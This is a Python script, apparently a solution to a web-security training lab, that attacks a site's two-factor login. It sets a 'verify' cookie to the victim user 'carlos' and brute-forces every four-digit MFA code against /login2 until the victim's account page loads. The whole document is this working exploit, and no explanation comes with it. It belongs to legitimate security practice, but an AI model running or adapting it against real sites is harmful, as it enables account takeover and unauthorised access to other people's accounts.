import sys
import requests

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
login_url = burp_url + '/login'
login_two = burp_url + '/login2'

session = requests.Session()

host = sys.argv[1].strip().rstrip('/')

session.get(burp_url)

session.cookies.set('verify', 'carlos', domain=f'{host[8:]}')
session.get(login_two)

for i in range(0, 10000):
    print(f'[ ] Trying to brute force 2FA code: {i:04}', end='\r')
    data = {'mfa-code': f'{i:04}'}
    r = session.post(f'{host}/login2', data, allow_redirects=True)
    if "Your username is: carlos" in r.text:
        print()
        print(f'Login to user carlos, gg')
        sys.exit(0)

